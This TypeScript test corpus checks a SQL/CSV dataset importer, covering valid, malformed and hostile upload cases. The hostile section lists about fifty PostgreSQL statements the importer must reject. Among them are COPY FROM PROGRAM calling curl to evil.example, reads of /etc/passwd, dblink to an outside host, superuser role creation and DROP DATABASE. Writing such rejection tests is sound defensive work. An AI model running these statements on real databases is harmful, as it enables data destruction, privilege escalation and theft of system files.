/**
 * Corpus for measuring the dataset-UPLOAD path with the real importer and a real database (no LLM involved).
 *   valid      → must be imported (status ready)
 *   malformed  → must be rejected with a readable reason (not the "unsupported statements" message: the file is broken, not hostile)
 *   malicious  → must be rejected with "This SQL file contains unsupported statements." and leave nothing behind
 */
import { COMPANY_SQL, CUSTOMERS_CSV, ORDERS_CSV, OTHER_SQL } from "../../helpers/datasets";
import { generateHr, generateSales, hrSql, salesCsvFiles } from "./data";

export interface UploadCase {
  id: string;
  kind: "valid_sql" | "valid_csv" | "malformed_sql" | "malformed_csv" | "malicious_sql";
  files: { name: string; text: string }[];
}

const sql = (id: string, kind: UploadCase["kind"], text: string): UploadCase => ({ id, kind, files: [{ name: `${id}.sql`, text }] });
const csv = (id: string, files: { name: string; text: string }[]): UploadCase => ({ id, kind: "valid_csv", files });
const badCsv = (id: string, text: string): UploadCase => ({ id, kind: "malformed_csv", files: [{ name: `${id}.csv`, text }] });
const OK = "CREATE TABLE ok (id int PRIMARY KEY, v text);\n";

export const UPLOAD_CORPUS: UploadCase[] = [
  // ── valid ──
  sql("valid-company", "valid_sql", COMPANY_SQL),
  sql("valid-hr-dump", "valid_sql", hrSql(generateHr())),
  sql("valid-same-table-name", "valid_sql", OTHER_SQL),
  sql("valid-schema-only", "valid_sql", "CREATE TABLE a (id serial PRIMARY KEY, name varchar(40) NOT NULL); CREATE TABLE b (id serial PRIMARY KEY, a_id int REFERENCES a(id));"),
  sql("valid-comments-and-noise", "valid_sql", "SET client_encoding = 'UTF8';\nBEGIN;\nCREATE TABLE public.t (id int PRIMARY KEY, n text);\nCOMMENT ON TABLE public.t IS 'things';\nINSERT INTO public.t VALUES (1, 'x''y');\nCOMMIT;\n"),
  csv("valid-sales-csv", salesCsvFiles(generateSales())),
  csv("valid-customers-orders", [{ name: "customers.csv", text: CUSTOMERS_CSV }, { name: "orders.csv", text: ORDERS_CSV }]),
  csv("valid-semicolon", [{ name: "people.csv", text: "id;name;score\n1;Ann;3,5\n2;Bo;4\n" }]),
  csv("valid-bom-crlf-quotes", [{ name: "notes.csv", text: "﻿id,note\r\n1,\"line one\nline two\"\r\n2,\"say \"\"hi\"\"\"\r\n" }]),
  csv("valid-header-only-empty-table", [{ name: "empty.csv", text: "id,name\n" }]),
  csv("valid-tab", [{ name: "t.csv", text: "id\tname\n1\ta\n2\tb\n" }]),

  // ── malformed (broken, not hostile) ──
  sql("bad-syntax", "malformed_sql", "CREATE TABLE a (id int,;"),
  sql("bad-unterminated-string", "malformed_sql", "CREATE TABLE a (id int, n text); INSERT INTO a VALUES (1, 'oops);"),
  sql("bad-empty", "malformed_sql", "   \n"),
  sql("bad-no-create-table", "malformed_sql", "BEGIN; COMMIT;"),
  sql("bad-insert-unknown-table", "malformed_sql", "CREATE TABLE a (id int); INSERT INTO b VALUES (1);"),
  sql("bad-duplicate-table", "malformed_sql", "CREATE TABLE a (id int); CREATE TABLE a (id int);"),
  sql("bad-fk-missing-table", "malformed_sql", "CREATE TABLE a (id int, b_id int REFERENCES missing(id));"),
  sql("bad-duplicate-pk-row", "malformed_sql", "CREATE TABLE a (id int PRIMARY KEY); INSERT INTO a VALUES (1), (1);"),
  sql("bad-type-mismatch", "malformed_sql", "CREATE TABLE a (id int); INSERT INTO a VALUES ('not a number');"),
  badCsv("bad-ragged-row", "id,name\n1,a\n2\n"),
  badCsv("bad-empty-csv", ""),
  badCsv("bad-unterminated-quote", 'id,name\n1,"abc\n'),
  badCsv("bad-binary", `id,name\n1,a${String.fromCharCode(0)}b\n`),

  // ── malicious (each appended to a valid CREATE TABLE so the whole file must be rejected, not just skipped) ──
  ...(
    [
      ["drop-table", "DROP TABLE nl2sql.query_runs;"],
      ["drop-database", "DROP DATABASE postgres;"],
      ["create-database", "CREATE DATABASE evil;"],
      ["grant", "GRANT ALL ON ALL TABLES IN SCHEMA nl2sql TO PUBLIC;"],
      ["revoke", "REVOKE ALL ON SCHEMA public FROM PUBLIC;"],
      ["create-role", "CREATE ROLE hacker SUPERUSER LOGIN PASSWORD 'x';"],
      ["alter-role", "ALTER ROLE postgres WITH SUPERUSER;"],
      ["drop-role", "DROP ROLE nl2sql_readonly;"],
      ["create-extension", "CREATE EXTENSION dblink;"],
      ["create-fdw", "CREATE FOREIGN DATA WRAPPER w;"],
      ["create-server", "CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'evil');"],
      ["copy-program", "COPY ok FROM PROGRAM 'curl http://evil.example';"],
      ["copy-file", "COPY ok FROM '/etc/passwd';"],
      ["read-file", "SELECT pg_read_file('/etc/passwd');"],
      ["do-block", "DO $$ BEGIN EXECUTE 'drop table nl2sql.query_runs'; END $$;"],
      ["create-function", "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql;"],
      ["create-procedure", "CREATE PROCEDURE p() LANGUAGE sql AS 'select 1';"],
      ["create-trigger", "CREATE TRIGGER t BEFORE INSERT ON ok FOR EACH ROW EXECUTE FUNCTION f();"],
      ["create-view", "CREATE VIEW v AS SELECT * FROM nl2sql.query_runs;"],
      ["create-sequence", "CREATE SEQUENCE s;"],
      ["create-type", "CREATE TYPE mood AS ENUM ('a','b');"],
      ["cross-schema-create", "CREATE TABLE nl2sql.evil (id int);"],
      ["cross-schema-insert", "INSERT INTO nl2sql.query_runs (user_question, status) VALUES ('x','error');"],
      ["cross-schema-fk", "CREATE TABLE t2 (id int REFERENCES nl2sql.query_runs(id));"],
      ["other-dataset-schema", "CREATE TABLE ds_0123456789.evil (id int);"],
      ["catalog-write", "INSERT INTO pg_catalog.pg_class (relname) VALUES ('x');"],
      ["catalog-shadow-table", 'CREATE TABLE "pg_class" (id int);'],
      ["select", "SELECT * FROM nl2sql.query_runs;"],
      ["update", "UPDATE nl2sql.query_runs SET status = 'x';"],
      ["delete", "DELETE FROM nl2sql.query_runs;"],
      ["truncate", "TRUNCATE nl2sql.query_runs;"],
      ["create-table-as", "CREATE TABLE x AS SELECT * FROM nl2sql.query_runs;"],
      ["temp-table", "CREATE TEMP TABLE t (id int);"],
      ["unlogged-table", "CREATE UNLOGGED TABLE t (id int);"],
      ["partitioned-table", "CREATE TABLE t (a int) PARTITION BY RANGE (a);"],
      ["inherited-table", "CREATE TABLE c () INHERITS (ok);"],
      ["subquery-in-check", "CREATE TABLE t (a int, CHECK ((SELECT count(*) FROM nl2sql.query_runs) > 0));"],
      ["subquery-in-values", "INSERT INTO ok VALUES (1, (SELECT 'x'));"],
      ["dangerous-function-default", "CREATE TABLE t (a text DEFAULT pg_read_file('/etc/passwd'));"],
      ["set-role", "SET ROLE postgres;"],
      ["set-search-path", "SET search_path = nl2sql, public;"],
      ["set-config", "SELECT set_config('search_path', 'nl2sql', false);"],
      ["alter-system", "ALTER SYSTEM SET log_statement = 'all';"],
      ["create-policy", "CREATE POLICY p ON ok USING (true);"],
      ["disable-rls", "ALTER TABLE ok DISABLE ROW LEVEL SECURITY;"],
      ["create-rule", "CREATE RULE r AS ON INSERT TO ok DO INSTEAD NOTHING;"],
      ["lo-import", "SELECT lo_import('/etc/passwd');"],
      ["dblink", "SELECT dblink_connect('host=evil');"],
      ["copy-stdout", "COPY ok TO STDOUT;"],
      ["create-schema", "CREATE SCHEMA evil;"],
    ] as [string, string][]
  ).map(([id, stmt]) => sql(`evil-${id}`, "malicious_sql", `${OK}${stmt}\n`)),
];
